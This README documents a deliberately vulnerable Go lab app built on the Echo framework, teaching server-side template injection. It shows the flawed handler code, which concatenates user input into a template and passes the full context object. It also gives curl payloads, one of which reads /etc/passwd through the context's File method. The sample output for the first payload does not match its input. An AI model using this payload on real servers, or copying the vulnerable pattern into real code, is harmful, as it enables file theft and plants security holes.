
# Go Vulnerable Lab: SSTI (Echo Framework)

This directory contains a Go application intentionally vulnerable to **Server-Side Template Injection (SSTI)**.

This vulnerability is **high-severity** because it demonstrates how passing a web framework's context object to the template engine can lead to **Arbitrary File Read**.

## The Vulnerability

The application uses the Echo framework. The handler at `/hello` makes two critical mistakes:

1.  It concatenates user input (the `name` parameter) directly into the template string.
2.  It passes the entire `echo.Context` object (`c`) as data to the `tmpl.Execute()` function.

```go
// VULNERABLE PART 1: User input becomes template code
templateString := "Hello, " + name
tmpl, err := template.New("ssti").Parse(templateString)

// VULNERABLE PART 2: Full context is passed as data
err = tmpl.Execute(c.Response().Writer, c)
```

Because the template has access to the `echo.Context` object, an attacker can call any of its exported methods.

## How to Run
1.  Ensure Go and the Echo framework are installed:
    ```bash
    go mod tidy
    ```
2.  Run the application:
    ```bash
    go run main.go
    ```

## How to Demonstrate the Vulnerability

### Simple Injection (Confirming the Flaw)

This payload executes simple template logic.

```bash
curl "http://localhost:8080/hello?name={{ \"World\" }}"
`Hello, SSTI`
```

### Arbitrary File Read

This payload calls the `.File()` method on the `echo.Context` object to read `/etc/passwd`.

```bash
curl "http://localhost:8080/hello?name={{ .File \"/etc/passwd\" }}"
```

The server responds with ` Hello,  ` followed by the contents of `/etc/passwd`.
